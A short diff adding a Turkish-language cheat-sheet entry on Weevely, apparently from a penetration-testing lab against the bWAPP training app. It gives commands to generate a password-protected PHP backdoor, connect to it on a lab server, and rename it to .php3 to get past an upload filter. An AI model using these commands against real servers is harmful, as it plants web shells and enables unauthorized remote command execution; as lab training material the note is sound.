@@ -1,0 +1,6 @@
+Weevely
+-> Purpose: PHP tabanlı backdoor oluşturarak hedef sunucuda uzaktan komut çalıştırmayı sağlar.
+
+-> Usage  : weevely generate 123456 myweevely.php
+	    weevely http://10.0.2.4/bWAPP/images/myweevely.php 123456
+	    > Sistem kabul etmezse dosya adini myweevely.php3 olarak değiştirmeyi dene.
